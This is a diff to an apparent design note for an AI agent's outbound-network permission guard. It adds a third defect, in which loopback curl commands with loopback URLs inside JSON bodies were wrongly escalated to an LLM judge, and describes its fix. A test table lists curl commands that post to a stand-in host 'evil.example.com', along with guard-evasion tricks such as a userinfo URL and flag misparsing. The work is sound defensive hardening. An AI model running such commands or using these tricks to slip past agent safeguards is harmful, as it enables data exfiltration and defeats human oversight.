@@ -12,7 +12,7 @@ tags:
   - security
   - shell-expansion
   - network
-timestamp: 2026-10-01T18:09:24Z
+timestamp: 2026-11-17T11:02:21Z
 ---
 # Loopback curl with a shell-variable port asked as exfiltration — and the `127.` prefix hole beside it
 
@@ -246,6 +246,39 @@ rewrite its own permission rules un-gated; the hand-rolled fallback is what
 keeps the guard over-asking. `isLoopbackHostForPermissionGuard` and its
 inet_aton shorthands (`127.1`, `0177.0.0.1`, `2130706433`, `0x7f000001`) are
 unchanged and still required.
+
+## Third defect: a curl data value with an embedded loopback URL (2026-11-17)
+
+**Symptom.** A loopback callback inside a JSON body lost the loopback proof:
+
+```
+curl -s -X POST http://127.0.0.1:4097/api/browse/grant -d '{"state_key":"tab:probe","url":"http://127.0.0.1:8123/"}'
+```
+
+The outbound-network guard then asked Jev, which answered `escalate` / `internal_target` (0.68). The user saw "Auto-denied by LLM permission model: outbound-request guardrail escalated". The 0.8 floor was not involved, because an escalate verdict escalates at any confidence. A loopback command reaches the judge only when the proof fails; the rubric's `internal_target` then matches 127.0.0.1.
+
+**Root cause.** `subprocessTargetsHostWithVars` treated every data-flag value containing `://` as a possible remote target and voided the proof. That rule is right for wget and httpie, where `-d`, `-H`, `-b` and `-F` take no value, so the next word can be the real target. curl's data flags always take a value.
+
+**Fix.** A `://` data value is skipped only when all of these hold:
+
+- the binary is `curl`;
+- the word before the flag is not itself a data-value flag, so `curl -o -d <value>` stays voided;
+- `dataValueURLsOnHost` passes: every embedded `://` URL is `http` or `https` and an on-host literal under `isLocalSubprocessToken`, so a port must be provably numeric.
+
+| Command (data value contains `://`) | Proof | What it covers |
+|---|---|---|
+| `curl -s -X POST http://127.0.0.1:4097/api/browse/grant -d '{"url":"http://127.0.0.1:8123/"}'` | holds | single-quoted JSON body, loopback callback |
+| `curl -d 'cb=http://localhost:3000/done' http://localhost:4096/x` | holds | localhost callback in a form value |
+| `curl -d '{"url":"https://evil.example.com/"}' http://127.0.0.1:4096/x` | voided | remote URL in the body |
+| `curl -d '{"a":"http://127.0.0.1:1/","b":"https://evil.example.com/"}' http://127.0.0.1:4096/x` | voided | mixed loopback and remote URLs |
+| `curl -d '{"url":"http://127.0.0.1@evil.example.com/"}' http://127.0.0.1:4096/x` | voided | userinfo trick |
+| `curl -d '{"url":"http://$h/"}' http://127.0.0.1:4096/x` | voided | expansion as the host |
+| `curl -d '{"url":"ftp://127.0.0.1/"}' http://127.0.0.1:4096/x` | voided | non-http scheme |
+| `curl -o -d 'evil.example.com/?u=http://127.0.0.1/' http://127.0.0.1:4096/x` | voided | `-d` is the value of `-o`, not a data flag |
+| `curl -d '{"url":"http://127.0.0.1:8123/"}' https://evil.example.com/x` | voided | the real target is remote |
+| `wget -d '{"url":"http://127.0.0.1:8123/"}' http://127.0.0.1:4096/x` | voided | wget `-d` takes no value, so the old rule stands |
+
+Pinned by `TestLoopbackDataValueWithEmbeddedLoopbackURL` (`permissions_exfil_gaps_test.go`) and `TestBashEgressLoopbackWithURLInJSONBody` (`network_guard_typesafe_test.go`).
 
 ## Scope
 
